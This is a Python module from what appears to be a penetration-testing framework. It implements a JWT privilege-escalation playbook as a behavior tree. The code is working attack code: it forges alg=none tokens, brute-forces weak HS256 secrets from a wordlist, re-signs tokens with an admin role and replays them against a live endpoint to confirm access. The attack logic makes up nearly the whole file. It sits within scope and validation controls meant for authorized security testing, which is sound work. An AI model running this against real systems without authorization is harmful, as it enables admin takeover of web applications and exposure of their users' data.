"""First end-to-end playbook: the JWT -> admin kill chain, built on py_trees.

A behavior-tree Selector (fallback) tries attacks in order and stops at the first that works:
``alg=none`` first, then ``brute weak HS256 secret -> forge admin token``. The crack + forge is
real offline crypto (HMAC-SHA256) driven through the Governor; the forged token is then REPLAYED
against the live target via the ACTIVE ``HttpReplayPrimitive``, and only genuine access (a 200
with data the original token can't reach) is handed to the deterministic Validator, which mints
the ``Finding``.

Imports ``py_trees`` (optional dep, install ``pentora[engine]``), so it is NOT re-exported from
``pentora.engine.__init__`` — the core stays importable without it.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
from dataclasses import dataclass
from typing import TYPE_CHECKING

import py_trees
from py_trees.behaviour import Behaviour
from py_trees.common import Status
from pydantic import BaseModel

from pentora.engine.blackboard import Blackboard
from pentora.engine.chainer import Pattern, Rule, RuleEngine
from pentora.engine.facts import (
    AttackAttempt,
    Fact,
    HttpTransaction,
    Hypothesis,
    Secret,
    SecurityContext,
    Task,
    TestedNegative,
)
from pentora.engine.primitive import (
    BlastRadius,
    Capability,
    Governor,
    Primitive,
    PrimitiveResult,
    RunContext,
    RunScope,
)
from pentora.engine.replay import HttpReplayPrimitive, ReplayInput
from pentora.engine.validator import DeterministicValidator

if TYPE_CHECKING:
    from pentora.engine.cart import CartEngine

# ---- offline HS256 crypto (real) -------------------------------------------

def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _sign_hs256(signing_input: bytes, secret: str) -> str:
    return _b64url_encode(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())


def crack_hs256(token: str, wordlist: list[str]) -> str | None:
    """Return the secret if the token's HS256 signature matches any candidate, else None."""
    try:
        header_b64, payload_b64, sig = token.split(".")
    except ValueError:
        return None
    signing_input = f"{header_b64}.{payload_b64}".encode()
    for secret in wordlist:
        if hmac.compare_digest(_sign_hs256(signing_input, secret), sig):
            return secret
    return None


def forge_hs256(token: str, secret: str, claims: dict[str, object]) -> str:
    """Re-issue the token with overridden claims, signed with the recovered secret."""
    header_b64, payload_b64, _ = token.split(".")
    payload = json.loads(_b64url_decode(payload_b64))
    payload.update(claims)
    new_payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{new_payload_b64}".encode()
    return f"{header_b64}.{new_payload_b64}.{_sign_hs256(signing_input, secret)}"


def forge_alg_none(token: str, claims: dict[str, object]) -> str:
    """Build an unsigned alg=none token with overridden claims."""
    _, payload_b64, _ = token.split(".")
    header_b64 = _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = json.loads(_b64url_decode(payload_b64))
    payload.update(claims)
    new_payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{new_payload_b64}."


# ---- the offline forge primitive (driven through the Governor) --------------

class JwtInput(BaseModel):
    jwt: str
    wordlist: list[str]


class JwtForgePrimitive(Primitive):
    name = "jwt_forge"
    version = "0.1"
    input_schema = JwtInput
    capability = Capability(
        read_only=True, destructive=False, idempotent=True, blast_radius=BlastRadius.PASSIVE
    )

    async def run(self, inp: BaseModel, ctx: RunContext) -> PrimitiveResult:
        if not isinstance(inp, JwtInput):
            return PrimitiveResult(summary="bad input", is_error=True)
        secret = crack_hs256(inp.jwt, inp.wordlist)
        if secret is None:
            return PrimitiveResult(summary="HS256 secret not in wordlist")
        forged = forge_hs256(inp.jwt, secret, {"role": "admin"})
        return PrimitiveResult(
            facts=[
                Secret(source=self.name, kind_of="jwt_hs256_secret", redacted=secret[:1] + "***"),
                AttackAttempt(source=self.name, primitive=self.name, outcome="success"),
            ],
            data={"forged_token": forged},
            summary="recovered weak HS256 secret; forged an admin token",
        )


# ---- the behavior tree (replays against a real target) ---------------------

@dataclass
class JwtPlaybookContext:
    bb: Blackboard
    governor: Governor
    validator: DeterministicValidator
    hypothesis: Hypothesis
    jwt: str
    wordlist: list[str]
    target_url: str                         # the live endpoint to replay tokens against
    scope: RunScope | None = None           # defaults to a permissive read-only scope

    def record_negative(self, what: str) -> None:
        self.bb.assert_fact(
            TestedNegative(source="jwt_playbook", what=what, derived_from=[self.hypothesis.id])
        )


def _replay(pctx: JwtPlaybookContext, token: str, role: str) -> tuple[int, str]:
    """Fire a real request with ``token`` via the Governor; return (status, body)."""
    scope = pctx.scope or RunScope(read_only=True)
    res = asyncio.run(
        pctx.governor.execute(
            HttpReplayPrimitive(),
            ReplayInput(url=pctx.target_url, token=token, role_label=role),
            RunContext(scope=scope, budget_requests=50),
        )
    )
    for f in res.facts:
        pctx.bb.assert_fact(f)
    return int(res.data.get("status", 0)), str(res.data.get("body", ""))


def _confirm_and_promote(
    pctx: JwtPlaybookContext, forged_status: int, forged_body: str, evidence_ids: list[str]
) -> bool:
    """Replay the original token as a control; only a real 200 differential promotes a Finding."""
    if forged_status != 200 or not forged_body.strip():
        return False
    orig_status, orig_body = _replay(pctx, pctx.jwt, "original")
    if forged_body == orig_body:                # no differential -> not proven
        return False
    fact = pctx.validator.promote(pctx.hypothesis, {
        "forged_token_authorized": forged_status == 200,
        "original_token_authorized": orig_status == 200,
        "authorized_marker_present": forged_body != orig_body,
        "evidence_ids": evidence_ids,
    })
    if fact is not None:
        pctx.bb.assert_fact(fact)
    return fact is not None


class _AlgNoneLeaf(Behaviour):
    def __init__(self, pctx: JwtPlaybookContext) -> None:
        super().__init__("jwt_alg_none")
        self.pctx = pctx

    def update(self) -> Status:
        forged = forge_alg_none(self.pctx.jwt, {"role": "admin"})
        status, body = _replay(self.pctx, forged, "forged_algnone")
        if _confirm_and_promote(self.pctx, status, body, evidence_ids=[]):
            return Status.SUCCESS
        self.pctx.record_negative("jwt alg=none rejected")
        return Status.FAILURE


class _BruteForgeLeaf(Behaviour):
    def __init__(self, pctx: JwtPlaybookContext) -> None:
        super().__init__("jwt_brute_forge")
        self.pctx = pctx

    def update(self) -> Status:
        p = self.pctx
        res = asyncio.run(
            p.governor.execute(
                JwtForgePrimitive(),
                JwtInput(jwt=p.jwt, wordlist=p.wordlist),
                RunContext(scope=RunScope(read_only=True), budget_requests=50),
            )
        )
        for f in res.facts:
            p.bb.assert_fact(f)
        token = res.data.get("forged_token")
        if not token:
            p.record_negative("jwt weak-secret brute failed")
            return Status.FAILURE
        status, body = _replay(p, token, "forged_brute")
        if _confirm_and_promote(p, status, body, evidence_ids=[f.id for f in res.facts]):
            return Status.SUCCESS
        p.record_negative("forged token not accepted")
        return Status.FAILURE


def build_jwt_playbook(pctx: JwtPlaybookContext) -> Behaviour:
    """A fallback Selector: try alg=none, else brute + forge. First success wins."""
    root = py_trees.composites.Selector(name="jwt_forge", memory=False)
    root.add_children([_AlgNoneLeaf(pctx), _BruteForgeLeaf(pctx)])
    return root


def run_jwt_playbook(pctx: JwtPlaybookContext) -> Status:
    """Tick the tree once (leaves resolve synchronously) and return the root status."""
    tree = build_jwt_playbook(pctx)
    tree.tick_once()
    return tree.status


# ---- CartEngine wiring: reusable rule + runner -----------------------------

def _sc_has_jwt(f: Fact) -> bool:
    return isinstance(f, SecurityContext) and f.has_jwt


def jwt_rule() -> Rule:
    """SOCKET: a SecurityContext carrying a JWT. TAB: a jwt_forge hypothesis + a queued task."""
    def action(engine: RuleEngine, b: dict[str, Fact]) -> None:
        sc = b["sc"]
        engine.assert_fact(Hypothesis(source="jwt_rule", claim="jwt_forge", derived_from=[sc.id]))
        engine.assert_fact(Task(source="jwt_rule", playbook="jwt_playbook", derived_from=[sc.id]))

    return Rule(
        name="jwt_seen",
        patterns=[Pattern(kind="security_context", where=_sc_has_jwt, as_="sc")],
        action=action,
    )


def jwt_runner(engine: CartEngine, task: Task) -> None:
    """CartEngine runner: build a JwtPlaybookContext from the blackboard and run the playbook."""
    bb = engine.bb
    sc = next(
        (f for f in bb.query("security_context")
         if isinstance(f, SecurityContext) and f.has_jwt and f.jwt),
        None,
    )
    hyp = next(
        (h for h in bb.query("hypothesis") if isinstance(h, Hypothesis) and h.claim == "jwt_forge"),
        None,
    )
    if sc is None or sc.jwt is None or hyp is None:
        return
    target = ""
    for t in bb.query("http_txn"):
        if isinstance(t, HttpTransaction) and t.source == "capture" and t.url.startswith("http"):
            target = t.url
            break
    if not target:
        target = str(engine.config.get("jwt_target", ""))
    if not target:
        return
    raw = engine.config.get("wordlist", [])
    wordlist = [str(w) for w in raw] if isinstance(raw, list) else []
    run_jwt_playbook(JwtPlaybookContext(
        bb=bb, governor=engine.governor, validator=engine.validator, hypothesis=hyp,
        jwt=sc.jwt, wordlist=wordlist, target_url=target, scope=engine.scope,
    ))
